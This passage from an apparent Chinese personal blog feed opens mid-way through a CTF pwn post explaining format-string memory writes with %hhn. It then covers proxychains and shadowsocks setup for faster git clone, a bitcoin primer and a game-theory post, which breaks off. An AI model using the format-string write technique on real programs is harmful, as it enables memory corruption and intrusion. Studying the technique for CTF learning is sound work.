-(0x22)，而0x78-0x22就等于0x56，也就是我们想要写入的第二个值，那么为什么又要加256呢？</p><p><strong>%hhn是具有溢出功能的，前面成功输出的字符个数超过255就会从0重新开始计数(比如260就相当于260-256=4)。所以加256并不影响结果，那这里为什么要加256呢？因为word-prev的值是负数，不能直接使用%[num]c (num为负数)，于是先加256，在后面计算输出字符个数的时候会自动减去256。这时候就相当于写入了0x56，后面的0x34，0x12依次类推。</strong></p><blockquote><p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p><p>上面是CTF-Wiki写的，我个人的理解是用%n写入0x12345678这个数据,%n是把已经成功输出字符的个数写入对应指针指向的整型(int)变量，整型(int)变量占4个字节，但是使用%hhn只会修改1个字节。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> format string </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git clone提速|使用proxychains+代理服务</title>
      <link href="/2020/04/13/fast-git-clone/"/>
      <url>/2020/04/13/fast-git-clone/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从 github上git clone资源，由于地域限制原因，大陆会特别慢，一般就在0-10KB/s的样子，用Xdown跑多线程都救不了。小项目都得等好久，大项目常规方式基本下不了。Windows现在可以使用国内的码云进行转接项目。但是对于linux虚拟机git clone的话，还是使用<strong>proxychain + 代理</strong>比较方便。</p><h2 id="kali-linux篇"><a href="#kali-linux篇" class="headerlink" title="kali linux篇"></a>kali linux篇</h2><blockquote><p>下面内容包括：<br>1.怎么从linux git clone自己的私库（涉及到RSA密码）<br>2.git clone from 太慢，怎么使用proxychains提速<br>3.如何安装linux的shadowsocks（官方教程亲测不行）</p></blockquote><h3 id="1-linux的github-ssh-key配置"><a href="#1-linux的github-ssh-key配置" class="headerlink" title="1.linux的github ssh key配置"></a>1.linux的github ssh key配置</h3><p><strong>（1）设置git 的user name 和email</strong><br>$ git config –global user.name “user_name”<br>$ git config –global user.email “<a href="mailto:xxx@gmail.com">xxx@gmail.com</a>“</p><p><strong>（2）生成密钥过程</strong><br>先查看有没有密钥（我就是弄了两次，第一次没弄好，一定要删除，不能把密钥弄混了）<br>用cd ~/.ssh命令查看是否生成密钥<br>生成密钥：<br>命令行：$ ssh-keygen -t rsa -C “<a href="mailto:xxx@gmail.com">xxx@gmail.com</a>”<br>连续三次回车，密码设置为空。</p><p>会得到两个文件：id_rsa和id_rsa.pub</p><p><strong>（3）github上添加密钥</strong><br>登录github，添加ssh，添加的密钥是id_rsa.pub里面的<br>添加好之后是这样的：<br><img src="https://img-blog.csdnimg.cn/20200412234232889.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="添加密钥成功"><br>如果还不行（我是可以），问题应该出在了git仓库没有和SSH key关联上，<br>命令行输入：ssh-add “你的 id-rsa 文件地址”<br>注意这里ssh-add后面填的是私钥地址<br>如mac电脑是 /Users/用户名/.ssh/id_rsa</p><p><strong>（4）测试：ssh <a href="mailto:git@github.com">git@github.com</a></strong></p><h3 id="2-kali使用proxychains-加速git-clone-from-github"><a href="#2-kali使用proxychains-加速git-clone-from-github" class="headerlink" title="2.kali使用proxychains 加速git clone from github"></a>2.kali使用proxychains 加速git clone from github</h3><p>仓库都搞好了，我应该高高兴兴去git clone了，然而…这速度能急死人，20%之后就特别慢了，国内能搜到的教程基本没用。<br><strong>安装proxychains</strong></p><pre><code>git clone https://github.com/rofl0r/proxychains-ngcd proxychains-ng./configuresudo make &amp;&amp; make installcp src/proxychains.conf /etc/proxychains.conf</code></pre><p><strong>配置proxychains</strong></p><pre><code>vim /etc/proxychains.conf在最后一行加上socks5  127.0.0.1 1080（只要socks5就行）</code></pre><p><img src="https://img-blog.csdnimg.cn/20200412235006812.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="配置完成"></p><h3 id="3-最后重点讲一下怎么在linux安装shadowsocks"><a href="#3-最后重点讲一下怎么在linux安装shadowsocks" class="headerlink" title="3.最后重点讲一下怎么在linux安装shadowsocks"></a>3.最后重点讲一下怎么在linux安装shadowsocks</h3><p><a href="https://www.jichang.uk/posts/shadowsocks-linux.html#%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86" target="_blank" rel="noopener">官网教程</a>（已失效）<br>第2点的proxychains我就是借鉴这个教程的（可用），但是它前面的那个shadowsocks安装方法已经失效了…被这个卡到抓狂。<br><a href="https://github.com/shadowsocks/shadowsocks-libev">有效教程</a><br><strong>（1）安装shadowsocks</strong></p><pre><code>apt install shadowsocks-libevvim /etc/shadowsocks.json</code></pre><p><strong>（2）配置shadowsocks</strong></p><pre><code>把在官网购买好的有效信息填进去即可，具体参考官网教程</code></pre><p><img src="https://img-blog.csdnimg.cn/2020041223525120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="配置信息"><br><strong>（3）启动shadowsocks</strong></p><pre><code>ss-local -c /etc/shadowsocks.json</code></pre><p><img src="https://img-blog.csdnimg.cn/20200412235352377.jpg#pic_center" alt="启动成功"><br><strong>（4）使用proxychains4代理</strong><br>启动完成如上图，新建一个窗口proxychains4即可<br><img src="https://img-blog.csdnimg.cn/20200412235452333.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="使用代理加速下载"></p><hr><h2 id="ubuntu16-04-篇"><a href="#ubuntu16-04-篇" class="headerlink" title="ubuntu16.04 篇"></a>ubuntu16.04 篇</h2><blockquote><p>给kali装了shadowsocks之后，git clone 嗖嗖的。今天配ubuntu16.04，新装的机打pwn用，配置pwndbg的时候git clone下载特别慢就想着给ubuntu也挂个代理。</p></blockquote><h3 id="1-ubuntu和kali的区别"><a href="#1-ubuntu和kali的区别" class="headerlink" title="1.ubuntu和kali的区别"></a>1.ubuntu和kali的区别</h3><p>ubuntu16.04和kali linux的区别在于<strong>ubuntu16.04的PPA中支持shadowsocks-libev的下载</strong><br><a href="https://zhuanlan.zhihu.com/p/55250294" target="_blank" rel="noopener">什么是PPA？</a><br><a href="https://launchpad.net/~max-c-lv/+archive/ubuntu/shadowsocks-libev" target="_blank" rel="noopener">怎么把shadowsocks-libev添加到PPA中</a></p><h3 id="2-添加shadowsocks到PPA并安装"><a href="#2-添加shadowsocks到PPA并安装" class="headerlink" title="2.添加shadowsocks到PPA并安装"></a>2.添加shadowsocks到PPA并安装</h3><p><strong>安装过程</strong></p><pre><code>sudo add-apt-repository ppa:max-c-lv/shadowsocks-libevsudo apt-get updatesudo apt install shadowsocks-libev</code></pre><p><strong>配置shadowsocks</strong></p><pre><code>vim /etc/shadowsocks.json</code></pre><p><img src="https://img-blog.csdnimg.cn/20200413001501379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="配置信息"></p><h3 id="3-下载proxychains"><a href="#3-下载proxychains" class="headerlink" title="3.下载proxychains"></a>3.下载proxychains</h3><p><strong>下载</strong></p><pre><code>apt install proxychains</code></pre><p><strong>配置</strong></p><pre><code>vim /etc/proxychains.conf最后一行加上 socks5 127.0.0.1 1080</code></pre><p><img src="https://img-blog.csdnimg.cn/20200413001643868.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="配置完成"><br><strong>使用proxychains+代理</strong></p><pre><code>ss-local -c /etc/shadowsocks.jsonproxychains git clone https://github.com/pwndbg/pwndbg</code></pre><blockquote><p>使用proxychains+代理，速度一般稳定在几百K/s，对于一般项目来说已经足够。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> git clone提速 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> ubuntu16.04 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链 | 比特币与区块链介绍以及区块链安全</title>
      <link href="/2020/04/12/block-chain/"/>
      <url>/2020/04/12/block-chain/</url>
      
        <content type="html"><![CDATA[<h1 id="第一节"><a href="#第一节" class="headerlink" title="第一节"></a>第一节</h1><blockquote><p>本节内容主要有：什么是比特币、比特币的起源与发展、区块及区块链的定义，矿机挖矿的原理。</p></blockquote><h2 id="什么是比特币"><a href="#什么是比特币" class="headerlink" title="什么是比特币"></a>什么是比特币</h2><p>比特币(BitCoin)是一种P2P形式的虚拟货币。2008年，一个名叫中本聪(Satoshi Nakamoto)的人发明了比特币，他在网络上发表了《比特币:一种点对点的电子现金系统》，即《白皮书》。点对点的传输意味着一个去中心化的电子记账系统的建立。</p><h3 id="去中心化的电子记账系统"><a href="#去中心化的电子记账系统" class="headerlink" title="去中心化的电子记账系统"></a>去中心化的电子记账系统</h3><p>和传统的记账方式不同（传统记账由银行来进行操作，可信度基于国家信用），去中心化则不需要依靠传统银行机构，每个人的账单记录都是公开的。<br><img src="https://img-blog.csdnimg.cn/20200412173201536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="传统记账系统"><br>举例来说，有A,B,C,D四个人进行交易，每次交易内容都会告诉其它三个人。<br><img src="https://img-blog.csdnimg.cn/20200412173320898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="去中心化的记账系统"></p><hr><h2 id="区块-amp-amp-区块链"><a href="#区块-amp-amp-区块链" class="headerlink" title="区块&amp;&amp;区块链"></a>区块&amp;&amp;区块链</h2><p>A,B,C,D四个人的账单信息进行打包，就形成了一个<strong>区块(block)</strong>。一般来说一个区块的大小大约为1M，可以存放4000条左右的记录。<br><img src="https://img-blog.csdnimg.cn/20200412173953708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="区块"><br>一个区块打包完成之后，把它接到前一个区块上，并且之后打包的区块接在目前这个区块之后，这样形成的一条链我们称为<strong>区块链(Block Chain)</strong>。<br><img src="https://img-blog.csdnimg.cn/20200412174527420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="区块链"></p><h3 id="为何我需要记账？"><a href="#为何我需要记账？" class="headerlink" title="为何我需要记账？"></a>为何我需要记账？</h3><blockquote><p>记录和自己的资金不相干的账单，占用了自己的电脑资源，我们为什么要记账？</p></blockquote><p><strong>记账奖励</strong><br>记账是由于记账可以得到奖励。<br><strong>（1）手续费</strong><br>举例来说，A支付10个比特币给B，实际上A支付的要比10个比特币多一点，多出的一点就是给记账人的手续费。（比特币交易的手续费比传统交易的手续费低）<br><strong>（2）打包奖励</strong><br>从比特币系统运行开始，在第一个四年里，每打一次包奖励50个比特币，在第二个四年里，每打一个包奖励25个比特币，在第三个四年里，每打一个包奖励12.5个比特币…依次类推，每过一个四年，打包奖励少一半。</p><h4 id="比特币总量"><a href="#比特币总量" class="headerlink" title="比特币总量"></a>比特币总量</h4><p>中本聪在最初提出比特币时，规定每十分钟打一个包。我们可以计算出比特币总量如下：</p><blockquote><p>50 <em> 6 </em> 24 <em> 365 </em> 4 * (1/2 + 1/4 +1/8 + …(1/2)^n^)=2100万</p></blockquote><h3 id="账单以谁为准？"><a href="#账单以谁为准？" class="headerlink" title="账单以谁为准？"></a>账单以谁为准？</h3><blockquote><p>因为记账奖励丰厚，一群人抢着去进行打包，但由于网络延迟，可能每个人收到账单不同，这种时候该以谁为准？</p></blockquote><h4 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h4><p>每一个参与打包的用户都要去做一个很难的数学题，如果你可以做出这道数学题，就可以去进行打包了。这个数学题难到没有哪一个人可以通过脑子去计算出来，而必须通过一个一个数去尝试，直到你去把这个数尝试出来了，就有机会去获得奖励，这个过程叫做<strong>挖矿</strong>。</p><h3 id="挖矿原理"><a href="#挖矿原理" class="headerlink" title="挖矿原理"></a>挖矿原理</h3><h4 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h4><p><strong>我们可以通过运算，把一串字符串转化成为一个摘要的形式。</strong> 并且正着算容易，反过来算很难（即可以通过字符串得到摘要，但不能通过摘要获得字符串）<br><strong>以SHA256函数举例：</strong></p><pre><code>sha256("abcd") = 1010...(256位二进制数)正算很容易，反算很难。如果给出一串256位的二进制数，求原来的输入，就只能通过一个一个尝试的方式去寻找。</code></pre><h4 id="具体原理"><a href="#具体原理" class="headerlink" title="具体原理"></a>具体原理</h4><p><strong>区块由头部和账单信息组成。</strong><br><img src="https://img-blog.csdnimg.cn/20200412181422148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="区块组成"><br>假设现在有很多人想要去接块，每个人都有一分记录好的账单。<br>在接块的时候必须要算一个数学题：<br><strong>1.字符串：前块的头部+账单信息+时间戳+…+随机数</strong><br><strong>2.Hash=sha256(sha256(字符串))</strong><br><strong>3.计算得到的Hash值需要符合要求</strong></p><blockquote><p>比如说要求前n位为0:即 Hash=000…11011（前n位为0即可满足条件，获得接块的权利）</p></blockquote><p><strong>4.符合要求之后进行打包</strong><br>把计算得到的Hash值作为新块的头部，账单作为新块的信息，即可打包成一个新块从而获得奖励。<br><img src="https://img-blog.csdnimg.cn/20200412182346723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="新块上链"><br><strong>怎么去使得字符串满足要求？</strong><br>我们来看字符串的组成，<strong>字符串：前块的头部+账单信息+时间戳+…+随机数</strong></p><p><strong>我们可以改变的只有随机数，二进制从0开始一直尝试。</strong> 每个人的计算难度是不一样的，但是平均而言，挖到矿的可能性大小与计算能力相关联，谁的计算能力强，谁就有更大的可能去挖到这个矿。</p><h4 id="挖矿难度设置"><a href="#挖矿难度设置" class="headerlink" title="挖矿难度设置"></a>挖矿难度设置</h4><p><strong>挖矿难度由要求Hash值的前n位来设置。</strong><br>前n位为指定数，比如前n个都是0，概率为 (1/2)^n^ 。<br>中本聪当初设置在每十分钟出一个块，如何保证在10分钟内能出一个块呢？则需要调整n的大小即挖矿难度。</p><blockquote><p>例：假设世界上有10^4^台矿机，每台矿机的运算速度为14T/s(即每秒可以进行1.4 <em> 10^13^次哈希运算)<br>10min计算次数：1.4 </em> 10^13^ <em> 10^4^ </em> 600 = 8 * 10^19^ ,大概相当于 2^66^ 。在这种情况下，就会把难度n设置为66。</p></blockquote><hr><h1 id="第二节"><a href="#第二节" class="headerlink" title="第二节"></a>第二节</h1><p>接上一节区块链和比特币的基本介绍，我们知道比特币的所有记录都是公开而且匿名的。这样比特币会面临几个问题：如何去解决伪造记录、篡改记录以及双重支付的问题。</p><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><blockquote><p>在传统认证方式中，通常会使用人脸认证、签名认证、指纹认证等方式，但是在电子支付系统上都不能实现，因为上述方式可以被拷贝之后伪造。</p></blockquote><h3 id="电子签名"><a href="#电子签名" class="headerlink" title="电子签名"></a>电子签名</h3><p>电子签名技术采用了目前广泛使用的非对称加密方式 <img src="https://img-blog.csdnimg.cn/20200412191558459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="电子签名技术"></p><h2 id="如何解决伪造记录"><a href="#如何解决伪造记录" class="headerlink" title="如何解决伪造记录"></a>如何解决伪造记录</h2><p>流程图：<br><img src="https://img-blog.csdnimg.cn/20200412211725241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="防止伪造记录"><br>解决伪造记录的关键在于使用<strong>非对称加密方式</strong></p><p>A给B10个比特币这一事件，通过hash运算得到摘要之后，用私钥对摘要进行加密得到密码。由于私钥的唯一性，摘要具有唯一性。通过广播的方式，A传递出去的消息有：A给B10个比特币，A的公钥，A的密码。<br>我们可以假设，A给B10个比特币的消息是假的，并根据此hash运算得到了摘要1。而利用A的公钥解密密码得到了摘要2，此时摘要1和摘要2不同，显然”A给B10个比特币”是伪造的消息。</p><h2 id="双重支付问题"><a href="#双重支付问题" class="headerlink" title="双重支付问题"></a>双重支付问题</h2><h3 id="余额检查-追溯法"><a href="#余额检查-追溯法" class="headerlink" title="余额检查(追溯法)"></a>余额检查(追溯法)</h3><blockquote><p>每个人在使用区块链比特币的时候，都会下载从第一个区块到目前为止的所有信息。<br>比如A广播了数据”A支付给B10个比特币”，其他人就会进行余额检查，检查A是否有这个支付能力，如果没有这个支付能力，那么其他人就不会去确认A广播的这条信息。当”A支付给B10个比特币”这个信息被打包到一个新的块里面，此时这条信息被确认。<br><img src="https://img-blog.csdnimg.cn/2020041221464217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="消息确认"></p></blockquote><h3 id="双重支付"><a href="#双重支付" class="headerlink" title="双重支付"></a>双重支付</h3><blockquote><p>当双重支付发生时，比如A只有10个比特币，但同时广播了消息”A给B10个比特币”(记为消息b)和”A给C10个比特币”（记为消息c），群体D先接收到消息b，则不会去确认消息c。同理，群体E先接收到消息c，则不会去确认消息b。这时候就要看群体D和E中谁先能计算出那道数学题，先挖出矿的可以把自己确认的消息写到新块中，而另一条消息则失效。<br><img src="https://img-blog.csdnimg.cn/20200412215749444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="如何防止双重支付"></p></blockquote><h2 id="防止篡改问题"><a href="#防止篡改问题" class="headerlink" title="防止篡改问题"></a>防止篡改问题</h2><h3 id="最长链原则"><a href="#最长链原则" class="headerlink" title="最长链原则"></a>最长链原则</h3><blockquote><p>当区块链出现分支的情况下，即有不止一个人在近乎相同时间内挖出了下一个块，链的走向出现了分支，一般而言使用最长链原则进行选择。假设用户群体A选择上链继续挖矿，用户群体B选择下链继续挖矿。如果群体A先挖出下一个矿，上链新块，则群体B转到新块后继续挖矿。通常情况下，下链被废弃。<br><img src="https://img-blog.csdnimg.cn/20200412221257165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="最长链原则"></p></blockquote><h3 id="如何防止篡改"><a href="#如何防止篡改" class="headerlink" title="如何防止篡改"></a>如何防止篡改</h3><blockquote><p>由最长链原则我们可以知道，如果有人想篡改区块链上某一区块的信息，他就要在该区块处引出一条分支，并且打造一条新链使得新链超过原链长度。即他一人控制的矿机算力要超过全世界剩余的矿机算力，显然很难实现。<br><img src="https://img-blog.csdnimg.cn/20200412222625409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="篡改信息"></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Bitcoin </category>
          
          <category> Block Chain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Block Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博弈论 | 三姬分金与囚徒困境</title>
      <link href="/2020/04/11/game/"/>
      <url>/2020/04/11/game/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在刷李永乐老师视频的时候看到了一个“三姬分金”的问题，然后引到了博弈论。说实话，从这个老师的课程中深深的感受到了知识的魅力。就想着写一个专栏，学习一下博弈论的有关知识。</p><p><strong>什么是博弈</strong></p><blockquote><p>通俗地讲， 博弈就是指游戏中的一种选择策略的研究。 博弈的英文为“game”， 我们一般将它翻译成“游戏”。 而在英语中， “game”的意义不同于汉语中的游戏， 它是人们遵循一定规则的活动， 进行活动的人的目的是让自己“赢”。 我们在和对手竞赛或游戏的时候怎样使自己赢呢？ 这不但要考虑自己的策略， 还要考虑其他人的选择。 生活中博弈的案例很多， 只要涉及人群的互动以及选择决策， 就有博弈。<br>一个人做选择时必须考虑其他人的选择或是事务的变化， 而其他人做选择时也会考虑此人的选择。 此人的结果——博弈论称之为支付， 不仅取决于他的行动选择——博弈论称之为策略选择， 同时取决于其他人的策略选择。 这样， 此人和其他人或事务就构成一个博弈。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200411201405346.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="博弈"></p><h2 id="三姬分金问题"><a href="#三姬分金问题" class="headerlink" title="三姬分金问题"></a>三姬分金问题</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><blockquote><p>当年，韩非子到一个大将军处索要军饷，看见大将军的三个妃子在玩分金币的游戏。于是韩非子提议，玩点更刺激的。</p></blockquote><h3 id="游戏规则"><a href="#游戏规则" class="headerlink" title="游戏规则"></a>游戏规则</h3><blockquote><p>现有A、B、C三名美姬，分100枚金币。从A开始，每个人依次提议分配方案。如果提议赞同人数不超过50%，则提议人被处死。反之则提议通过。A、B、C的顺序通过抽签来决定。<br>此外，有两点前提：<br>1.每个人都是聪明的，即她知道每个提议带来的后果，并追求自己利益的最大化。<br>2.每个人都是邪恶的，在她追求自己利益最大化的同时，要尽量多的杀死其余美姬。</p></blockquote><h3 id="思维实验0"><a href="#思维实验0" class="headerlink" title="思维实验0"></a>思维实验0</h3><p>如果游戏按照规则进行，那么结果会是怎样？<br>（1）我们不妨先假设A的提议被B、C否决：<br>美姬A被处死，到美姬B提议，根据规则”赞同人数不超过50%则提议人被处死”，故无论美姬B提议什么，美姬C都不会同意（即使B提议金币全给C也是如此）。美姬B这么聪明当然也考虑到了这个问题。<br>（2）美姬A提议必然通过：<br>由（1）中分析，美姬A的提议必然会被B同意（B不同意就死），所以A可以肆无忌惮的提议分配方案，故A提出了（100,0,0）的分配方案，实现了自己利益最大化。</p><p><strong>在思维实验0中，美姬A具有先手优势。</strong></p><hr><h3 id="思维实验1"><a href="#思维实验1" class="headerlink" title="思维实验1"></a>思维实验1</h3><p>假设在美姬A前面加一个美姬X，其他规则不变，结果会如何？<br>（1）不妨先假设美姬X的提议被否决：<br>美姬X被处死，到美姬A提议，参考思维实验0可知，美姬A还是提出（100,0,0）的提议，且必定被通过。<br>（2）美姬X提出方案对B，C有利则会被通过：<br>美姬X考虑到如果由美姬A提议，则B,C什么都得不到。故美姬X决定拉拢美姬B,C。她提出了（98,0，1,1）的分配方案。美姬A肯定不同意（但是没有用），美姬B,C一看还能得到1枚金币，于是通过了美姬X的提议方案。<br><strong>在思维实验1中，美姬X具有先手优势，即领导群体，美姬B、C属于基层群体，是领导群体拉拢的对象。在有限次的实验中，拿到先手权意味着锁定胜局。而且只要条件规则稳定，结果是一定的，这样的局面叫做纳什均衡</strong></p><hr><h3 id="思维实验2"><a href="#思维实验2" class="headerlink" title="思维实验2"></a>思维实验2</h3><p><strong>共谋</strong></p><blockquote><p>在思维实验1的背景下，美姬A,B,C觉得不公平，还想实现利益最大化。于是A提议：否定美姬X的提议，A,B,C各分33枚金币，剩下一枚丢进海里。这个过程叫做”共谋”。</p></blockquote><p>那么在实验的过程中，如何保证在杀掉美姬X之后，美姬A信守承诺均分金币呢？<br>A,B,C之间需要制定一个契约，规定B,C帮助A杀掉X之后，A能信守承诺均分金币。此外，为了防止A撕毁契约，还需要执行和守护契约的团体，通过分权的方式使其不能串通。执行和守护契约的团体的建立权在B,C手中，即实现了”民主”。</p><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>三姬分金这个故事很好的解释了社会中的一些现象：古代统治者为何需要拉拢底层人民、为何大副都想当船长…</p><blockquote><p>《1984》里面写到：有史以来，大概自从新石器时代结束以来，世上就有三种人，即上等人、中等人、下等人。 这三种人的目标是完全不可调和的。上等人的目标是要保持他们的地位。中等人的目标是要同高等人交换地位。下等人的特点始终是，他们劳苦之余无暇旁顾，偶而才顾到日常生活以外的事，因此他们如果有目标的话，无非是取消一切差别，建立一个人人平等的社会。</p></blockquote><hr><h2 id="囚徒困境问题"><a href="#囚徒困境问题" class="headerlink" title="囚徒困境问题"></a>囚徒困境问题</h2><h3 id="问题简介"><a href="#问题简介" class="headerlink" title="问题简介"></a>问题简介</h3><p><a href="https://wiki.mbalib.com/wiki/%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83" target="_blank" rel="noopener">囚徒困境</a>是博弈论的<a href="https://wiki.mbalib.com/wiki/%E9%9D%9E%E9%9B%B6%E5%92%8C%E5%8D%9A%E5%BC%88" target="_blank" rel="noopener">非零和博弈</a>中具代表性的例子，反映个人最佳选择并非团体最佳选择。虽然困境本身只属模型性质，但现实中的价格竞争、环境保护等方面，也会频繁出现类似情况。</p><hr><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>1950年，由就职于兰德公司的梅里尔·弗拉德（Merrill Flood）和梅尔文·德雷希尔（Melvin Dresher）拟定出相关困境的理论，后来由顾问阿尔伯特·塔克（Albert Tucker）以囚徒方式阐述，并命名为“囚徒困境”。经典的囚徒困境如下：</p><blockquote><p>警方逮捕甲、乙两名嫌疑犯，但没有足够证据指控二人入罪。于是警方分开囚禁嫌疑犯，分别和二人见面，并向双方提供以下相同的选择：</p></blockquote><blockquote><p>若一人认罪并作证检举对方（相关术语称“背叛”对方），而对方保持沉默，此人将即时获释，沉默者将判监10年。<br><img src="https://img-blog.csdnimg.cn/20200411203310243.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="一方背叛"></p></blockquote><blockquote><p>若二人都保持沉默（相关术语称互相“合作”），则二人同样判监一年。<br><img src="https://img-blog.csdnimg.cn/20200411203250576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" 